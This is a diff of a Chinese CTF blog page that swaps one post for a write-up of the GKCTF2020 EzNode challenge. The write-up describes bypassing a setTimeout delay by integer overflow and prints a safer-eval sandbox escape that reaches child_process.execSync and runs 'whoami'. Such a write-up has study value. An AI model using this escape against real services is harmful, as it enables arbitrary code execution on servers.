@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>[BJDCTF 2nd]假猪套天下第一 | ev11ccaatt</title>
+<title>[GKCTF2020]EZ三剑客-EzNode | ev11ccaatt</title>
 <meta name="description" content="人菜多学">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,22 +80,28 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">[BJDCTF 2nd]假猪套天下第一</h2>
+          <h2 class="post-title">[GKCTF2020]EZ三剑客-EzNode</h2>
           <div class="post-info post-detail-info">
-            <span><i class="icon-calendar-outline"></i> 2021-03-30</span>
+            <span><i class="icon-calendar-outline"></i> 2021-04-17</span>
             
           </div>
           <div class="post-content">
-            <p>不是很想写，但还是做个记录，添加一系列的头。就能拿到一串base64。</p>
+            <p>进去能够看到源码，和版本信息。这里<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417173803293.png" alt="image-20210417173803293" loading="lazy">提到了一个库，然后也提供了其版本，尝试去找下是否有已知的，是有<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-36849">国家信息安全漏洞共享平台 (cnvd.org.cn)</a>但是版本要&lt;1.3.2</p>
+<p>那么再来看下源码，发现不管算什么，都会超时，那么考虑把<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417174240697.png" alt="image-20210417174240697" loading="lazy">这一块给绕过，可以采用setTimeout自带的int溢出洞来绕过（如果传入的delay&gt;2147483647，那么delay会被设为1。</p>
+<p>在<a href="https://github.com/commenthol/safer-eval/issues/10">Breakout · Issue #10 · commenthol/safer-eval (github.com)</a>找到答案,</p>
+<pre><code class="language-(function(){">const process = clearImmediate.constructor(&quot;return process;&quot;)();
+return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()})()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417180101184.png" alt="image-20210417180101184" loading="lazy"></figure>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf-2ndold-hack/">
+            <a class="purple-link" href="https://ev11ccaatt.github.io/post/dc-2/">
               <h3 class="post-title">
-                下一篇：[BJDCTF 2nd]old-hack
+                下一篇：DC-2
               </h3>
             </a>
           </div>
